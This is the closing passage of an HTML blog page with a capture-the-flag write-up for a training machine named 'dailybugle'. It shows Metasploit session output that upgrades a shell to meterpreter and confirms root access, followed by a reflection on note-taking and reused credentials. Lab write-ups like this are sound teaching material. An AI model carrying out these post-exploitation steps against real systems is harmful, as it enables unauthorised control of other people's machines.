</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Post module execution completed
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 4...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 4...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; getuid
</span></span><span style=display:flex><span>Server username: no-user @ dailybugle <span style=color:#f92672>(</span>uid<span style=color:#f92672>=</span>0, gid<span style=color:#f92672>=</span>0, euid<span style=color:#f92672>=</span>0, egid<span style=color:#f92672>=</span>0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>meterpreter &gt; shell
</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>4873</span> created.
</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>1</span> created.
</span></span><span style=display:flex><span>whoami
</span></span><span style=display:flex><span>root
</span></span></code></pre></div><p>Success! With the session upgraded, I confirmed that I had a root account and quickly found the root flag under <code>/root/root.txt</code></p><h2 id=summary>Summary <a href=#summary class=anchor>üîó</a></h2><p>This challenge really impressed onto me the importance of diligently taking notes. On my first pass I found, but failed to note, the root mysql user&rsquo;s password. This lead to me rabbitholing for hours trying to find a local exploit method to move from the apache user to <code>jjameson</code>. It took me walking away and taking stock of everything I knew before I thought to compile and run the known credentials against <code>jjameson</code>. The largest lesson I learned is to note everything, especially credentials, as user&rsquo;s might reuse the same credentials many times.</p></div><div class=tags><a href=https://ncatelli.github.io/tags/ctf>ctf</a>
<a href=https://ncatelli.github.io/tags/boot2root>boot2root</a>
<a href=https://ncatelli.github.io/tags/hacking>hacking</a>
<a href=https://ncatelli.github.io/tags/writeup>writeup</a>
<a href=https://ncatelli.github.io/tags/tryhackme>tryhackme</a></div></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/ncatelli/ rel=me target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64c4.418278.0 8-3.581722 8-8V8c0-4.418278-3.581722-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64c541083001e-24 4.418278 3.581722 8 8 8z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644c0 10.6440272 6.876 19.6751861 16.4145 22.8617681C29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482c-6.6765 1.4562499-8.085-3.2302544-8.085-3.2302544-1.0905-2.7829884-2.664-3.5239139-2.664-3.5239139C17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943c2.4075.1701719 3.675 2.4833051 3.675 2.4833051 2.142 3.6820383 5.6175 2.6188404 6.9855 2.0014024C30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671c0-2.6308879.9345-4.781379 2.4705-6.4665327C22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585c0 0 2.016-.6475568 6.6 2.4697516C31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101c4.581-3.1173084 6.5925-2.4697516 6.5925-2.4697516C49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671c0 9.2555448-5.6115 11.29309-10.9575 11.8894446.860999999999997.7439374 1.629 2.2137408 1.629 4.4621184C41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a></div><div class=copyright></div></footer></body></html>